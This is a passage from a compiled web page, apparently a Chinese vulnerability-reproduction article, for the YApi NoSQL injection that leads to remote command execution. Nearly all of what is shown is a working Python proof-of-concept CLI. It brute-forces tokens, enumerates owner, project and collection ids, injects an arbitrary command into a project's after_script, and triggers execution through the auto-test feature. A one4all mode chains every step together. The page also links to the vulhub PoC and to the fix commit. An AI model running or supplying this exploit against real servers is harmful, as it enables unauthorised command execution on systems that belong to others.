        <span class="token keyword">if</span> <span class="token keyword">not</span> token<span class="token punctuation">:</span>
            <span class="token keyword">break</span>

        click<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;find a valid token: </span><span class="token interpolation"><span class="token punctuation">{</span>token<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
        already<span class="token punctuation">.</span>append<span class="token punctuation">(</span>token<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@cli<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span><span class="token string">&#39;owner&#39;</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;-u&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--url&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;-t&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--token&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;token&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Token that get from first step&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">cmd_owner</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    aid <span class="token operator">=</span> find_owner_uid<span class="token punctuation">(</span>url<span class="token punctuation">,</span> token<span class="token punctuation">)</span>
    e <span class="token operator">=</span> aes_encode<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>aid<span class="token punctuation">}</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">{</span>token<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
    click<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;your owner id is: </span><span class="token interpolation"><span class="token punctuation">{</span>aid<span class="token punctuation">}</span></span><span class="token string">, encrypted token is </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@cli<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span><span class="token string">&#39;project&#39;</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;-u&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--url&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;-o&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--owner-id&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;owner&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;-t&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--token&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;token&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Token that get from first step&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">cmd_project</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> owner<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    token <span class="token operator">=</span> aes_encode<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>owner<span class="token punctuation">}</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">{</span>token<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
    project <span class="token operator">=</span> find_project<span class="token punctuation">(</span>url<span class="token punctuation">,</span> token<span class="token punctuation">)</span>
    <span class="token keyword">if</span> project<span class="token punctuation">:</span>
        logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&#39;[+] project by this token: %r&#39;</span><span class="token punctuation">,</span> project<span class="token punctuation">)</span>
        click<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;your project id is: </span><span class="token interpolation"><span class="token punctuation">{</span>project<span class="token punctuation">[</span><span class="token string">&quot;_id&quot;</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@cli<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span><span class="token string">&#39;col&#39;</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;-u&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--url&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;-o&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--owner-id&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;owner&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;-t&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--token&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;token&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Token that get from first step&#39;</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;--from&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;brute_from&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Brute Col id from this number&#39;</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;--to&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;brute_to&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Brute Col id to this number&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">cmd_col</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> owner<span class="token punctuation">,</span> token<span class="token punctuation">,</span> brute_from<span class="token punctuation">,</span> brute_to<span class="token punctuation">)</span><span class="token punctuation">:</span>
    token <span class="token operator">=</span> aes_encode<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>owner<span class="token punctuation">}</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">{</span>token<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> find_col<span class="token punctuation">(</span>url<span class="token punctuation">,</span> token<span class="token punctuation">,</span> brute_from<span class="token punctuation">,</span> brute_to<span class="token punctuation">)</span><span class="token punctuation">:</span>
        click<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;found a valid col id: </span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@cli<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span><span class="token string">&#39;rce&#39;</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;-u&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--url&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;-o&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--owner-id&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;owner&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;-t&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--token&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;token&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Token that get from first step&#39;</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;--pid&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;project_id&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;--cid&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;col_id&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;-c&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--command&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;command&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Command that you want to execute&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">cmd_rce</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> owner<span class="token punctuation">,</span> token<span class="token punctuation">,</span> project_id<span class="token punctuation">,</span> col_id<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">:</span>
    token <span class="token operator">=</span> aes_encode<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>owner<span class="token punctuation">}</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">{</span>token<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
    project <span class="token operator">=</span> find_project<span class="token punctuation">(</span>url<span class="token punctuation">,</span> token<span class="token punctuation">,</span> project_id<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> project<span class="token punctuation">:</span>
        click<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">&#39;[-] failed to get project&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    old_after_script <span class="token operator">=</span> project<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;after_script&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> update_project<span class="token punctuation">(</span>url<span class="token punctuation">,</span> token<span class="token punctuation">,</span> project_id<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">:</span>
        click<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string">&#39;[-] failed to update project&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    output <span class="token operator">=</span> run_auto_test<span class="token punctuation">(</span>url<span class="token punctuation">,</span> token<span class="token punctuation">,</span> col_id<span class="token punctuation">)</span>
    <span class="token keyword">if</span> output<span class="token punctuation">:</span>
        click<span class="token punctuation">.</span>echo<span class="token punctuation">(</span>output<span class="token punctuation">)</span>
        clear_project<span class="token punctuation">(</span>url<span class="token punctuation">,</span> token<span class="token punctuation">,</span> project_id<span class="token punctuation">,</span> old_after_script<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>

    clear_project<span class="token punctuation">(</span>url<span class="token punctuation">,</span> token<span class="token punctuation">,</span> project_id<span class="token punctuation">,</span> old_after_script<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token decorator annotation punctuation">@cli<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span><span class="token string">&#39;one4all&#39;</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;-u&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--url&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;--count&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">&#39;-c&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--command&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&#39;id&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">cmd_one4all</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> count<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">:</span>
    already <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>
        token <span class="token operator">=</span> brute_token<span class="token punctuation">(</span>url<span class="token punctuation">,</span> already<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> token<span class="token punctuation">:</span>
            logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&#39;[-] no new token found, exit...&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>

        already<span class="token punctuation">.</span>append<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
        logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&#39;[+] find a new token: %s&#39;</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>
        owner_id <span class="token operator">=</span> find_owner_uid<span class="token punctuation">(</span>url<span class="token punctuation">,</span> token<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> owner_id<span class="token punctuation">:</span>
            logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&#39;[-] failed to find the owner id using token %s&#39;</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>
            <span class="token keyword">continue</span>

        etoken <span class="token operator">=</span> aes_encode<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>owner_id<span class="token punctuation">}</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">{</span>token<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
        logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&#39;[+] find a new owner id: %r, encrypted token: %s&#39;</span><span class="token punctuation">,</span> owner_id<span class="token punctuation">,</span> etoken<span class="token punctuation">)</span>
        project <span class="token operator">=</span> find_project<span class="token punctuation">(</span>url<span class="token punctuation">,</span> etoken<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> project<span class="token punctuation">:</span>
            logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&#39;[-] failed to find project using token %s&#39;</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>
            <span class="token keyword">continue</span>

        project_id <span class="token operator">=</span> project<span class="token punctuation">[</span><span class="token string">&#39;_id&#39;</span><span class="token punctuation">]</span>
        logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&#39;[+] project_id = %s, project = %r&#39;</span><span class="token punctuation">,</span> project_id<span class="token punctuation">,</span> project<span class="token punctuation">)</span>
        col_ids <span class="token operator">=</span> find_col<span class="token punctuation">(</span>url<span class="token punctuation">,</span> etoken<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> col_ids<span class="token punctuation">:</span>
            logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&#39;[+] failed to find cols in project %s, try next project...&#39;</span><span class="token punctuation">,</span> project_id<span class="token punctuation">)</span>

        <span class="token keyword">for</span> col_id <span class="token keyword">in</span> col_ids<span class="token punctuation">:</span>
            logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&#39;[+] col_id = %s&#39;</span><span class="token punctuation">,</span> col_id<span class="token punctuation">)</span>
            click<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;hit: project_id: </span><span class="token interpolation"><span class="token punctuation">{</span>project_id<span class="token punctuation">}</span></span><span class="token string"> | owner_id: </span><span class="token interpolation"><span class="token punctuation">{</span>owner_id<span class="token punctuation">}</span></span><span class="token string"> | col_id: </span><span class="token interpolation"><span class="token punctuation">{</span>col_id<span class="token punctuation">}</span></span><span class="token string"> | token: </span><span class="token interpolation"><span class="token punctuation">{</span>token<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
            click<span class="token punctuation">.</span>echo<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;suggestion: python </span><span class="token interpolation"><span class="token punctuation">{</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string"> rce -u </span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string"> -t </span><span class="token interpolation"><span class="token punctuation">{</span>token<span class="token punctuation">}</span></span><span class="token string"> -o </span><span class="token interpolation"><span class="token punctuation">{</span>owner_id<span class="token punctuation">}</span></span><span class="token string"> --pid </span><span class="token interpolation"><span class="token punctuation">{</span>project_id<span class="token punctuation">}</span></span><span class="token string"> --cid </span><span class="token interpolation"><span class="token punctuation">{</span>col_id<span class="token punctuation">}</span></span><span class="token string"> --command=&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>command<span class="token punctuation">}</span></span><span class="token string">&quot;&#39;</span></span><span class="token punctuation">)</span>

            <span class="token keyword">if</span> cmd_rce<span class="token punctuation">.</span>callback<span class="token punctuation">(</span>url<span class="token punctuation">,</span> owner_id<span class="token punctuation">,</span> token<span class="token punctuation">,</span> project_id<span class="token punctuation">,</span> col_id<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    cli<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function y(f,_){const a=e("ExternalLinkIcon");return c(),i("div",null,[u,k,n("ul",null,[n("li",null,[n("a",r,[s("https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c"),t(a)])])]),d,n("p",null,[s("使用"),n("a",v,[s("这个POC"),t(a)]),s("来复现漏洞：")]),m,n("ul",null,[n("li",null,[n("a",b,[s("https://github.com/vulhub/vulhub/blob/master/yapi/mongodb-inj/poc.py"),t(a)])])]),g])}const j=o(l,[["render",y],["__file","YApi NoSQL注入导致远程命令执行漏洞.html.vue"]]);export{j as default};
